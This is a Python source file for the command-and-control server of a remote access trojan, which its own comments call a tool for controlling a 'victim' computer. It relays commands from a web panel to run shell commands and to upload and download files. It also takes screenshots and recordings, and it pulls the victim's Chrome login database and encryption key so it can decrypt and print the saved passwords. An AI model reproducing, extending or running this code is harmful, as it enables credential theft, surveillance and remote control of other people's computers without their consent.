import socket
import threading
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta


class Server:
    port = None
    ip = None
    listen_count = None
    client_name = ''

    def __init__(self, port, ip, listen_count, client_name):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count
        self.client_name = client_name

    def start_server_listen(self):
        self.s = socket.socket()
        self.s.bind((self.ip, self.port))
        self.s.listen(self.listen_count)
        self.server_socket, self.adress = self.s.accept()

    def connect_to_web(self):
        self.sock = socket.socket()
        self.sock.bind((self.ip, 8888))
        self.sock.listen(self.listen_count)
        self.sock.listen(1)
        self.web_server_socket, self.web_adress = self.sock.accept()

    def runThread(self):
        self.start_server_listen()
        print('connected to victim')
        self.connect_to_web()
        print('connected to node.js')
        self.get_command_from_server()

    def get_chrome_datetime(self, chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        with open(os.path.join(os.environ["USERPROFILE"],
                               "AppData", "Local", "Google", "Chrome",
                               "User Data", "Local State"), "r", encoding="utf-8") as file:
            local_state = file.read()
            local_state = json.loads(local_state)
        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    def decode_chrome_passwords(self):
        # get the AES key
        key = self.get_encryption_key()

        # connect to the database
        db = sqlite3.connect("ChromeData")
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
            print("=" * 50)
        cursor.close()
        db.close()

    def receive_file_from_client(self, path_to_save):

        # Take from the victim file
        if path_to_save == "":
            path_to_save = file_path = input("Where do you want save the file?\n")

        with open(path_to_save, 'wb')as f:
            print('Open File')
            while True:
                data = self.server_socket.recv(1024)
                if not data or len(data) < 1024:
                    if data:
                        f.write(data)
                    f.flush()
                    f.close()
                    break
                f.write(data)
        print('done')

    def send_file_to_client(self, data):
        # Send to the victim files
        victim_path = input('Where do you want save the file\n')
        self.server_socket.sendall(victim_path.encode('utf-8'))
        f = open(data, 'rb')
        while True:
            content = f.read(1024)
            if content:
                self.server_socket.sendall(content)
            else:
                f.close()
                break

    def get_command_from_server(self):
        while True:
            command = self.web_server_socket.recv(1024).decode()
            self.run_command(command)

    def run_command(self, command):
        print("test")
        print(command)
        data = None
        self.server_socket.send(command.encode('utf-8'))

        # recv file (file name on victim computer)
        if command.startswith('recv file'):
            self.receive_file_from_client("")

        # for sending mcd commands to victim computer
        elif command.startswith("cmd"):
            data = self.server_socket.recv(2048)
            print(data.decode('utf-8', 'ignore'))


        elif command.startswith("get files"):
            data = self.server_socket.recv(20)
            try:
                data = self.server_socket.recv(int(data.decode()))
                print(data.decode())
            except:
                print(data)


        elif command.startswith('download file '):
            command = command[14:-1] + command[-1]
            self.send_file_to_client(command)


        elif command.startswith('take record '):
            command = command[12:-1] + command[-1]
            self.server_socket.sendall(command.encode('utf-8'))
            path = input("Where do you want save the file on victim computer\n")
            self.server_socket.sendall(path.encode('utf-8'))
            self.receive_file_from_client("")

        elif command.startswith("get chrome passwords"):
            self.receive_file_from_client("ChromeKey")
            self.receive_file_from_client("ChromeData")
            self.decode_chrome_passwords()

        elif command.startswith('take screenshot '):
            self.receive_file_from_client("")

        elif command == 'exit':
            return

        elif command.startswith('listen'):
            self.receive_file_from_client("")

        elif command == 'exit':
            self.server_socket.close()
            pass

        elif command == 'q':
            print("quitting")
            self.server_socket.close()
            quit(1)

        else:
            data = self.server_socket.recv(1024).decode('utf-8')
            print(data)
            self.web_server_socket.send(data.encode())
            return

        self.web_server_socket.send(data)

    # self.server_socket.close()


myServer = Server(7613, '127.0.0.1', 1, 'client1')
myServer2 = Server(9999, '127.0.0.1', 1, 'client2')

t1 = threading.Thread(target=myServer.runThread, args=())
t2 = threading.Thread(target=myServer2.runThread, args=())

t1.start()
t2.start()

t1.join()
t2.join()
